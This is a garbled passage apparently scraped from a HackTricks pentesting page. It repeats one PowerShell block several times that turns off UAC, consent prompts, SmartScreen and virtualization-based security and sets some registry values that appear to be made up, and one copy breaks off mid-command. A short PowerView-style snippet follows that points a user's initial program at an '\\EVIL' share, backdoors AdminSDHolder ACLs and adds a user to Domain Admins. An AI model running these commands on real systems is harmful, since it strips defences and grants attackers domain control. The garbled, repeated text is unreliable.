Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableSecureBootLogging' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableSmartScreen' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableRemoteShellAccess' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableCursorSuppression' -Value 1
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableCursorSuppressionTimeout' -Value 2000
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableCredSSPSupport' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLinkedConnections' -Value 0
```

```powershell
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorUser' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableVirtualizationBasedSecurity' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableUIADesktopToggle' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'PromptOnSecureDesktop' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableSecureUIAPaths' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'FilterAdministratorToken' -Value 1
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableInstallerDetection' -Value 1
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableSecureBootLogging' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableSmartScreen' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableRemoteShellAccess' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableCursorSuppression' -Value 1
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableCursorSuppressionTimeout' -Value 2000
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableCredSSPSupport' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLinkedConnections' -Value 0
```

```powershell
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorUser' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableVirtualizationBasedSecurity' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableUIADesktopToggle' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'PromptOnSecureDesktop' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableSecureUIAPaths' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'FilterAdministratorToken' -Value 1
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableInstallerDetection' -Value 1
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableSecureBootLogging' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableSmartScreen' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableRemoteShellAccess' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableCursorSuppression' -Value 1
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableCursorSuppressionTimeout' -Value 2000
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableCredSSPSupport' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLinkedConnections' -Value 0
```

```powershell
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorUser' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableVirtualizationBasedSecurity' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableUIADesktopToggle' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'PromptOnSecureDesktop' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableSecureUIAPaths' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'FilterAdministratorToken' -Value 1
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableInstallerDetection' -Value 1
Set-Item
```powershell
# set the specified property for the given user identity
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose
# Set the owner of 'dfm' in the current domain to 'harmj0y'
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y
# ackdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
# Add user to 'Domain Admins'
Add-NetGroupUser -Username username -GroupName 'Domain Admins' -Domain my.domain.local
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã‚’å…¥æ‰‹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
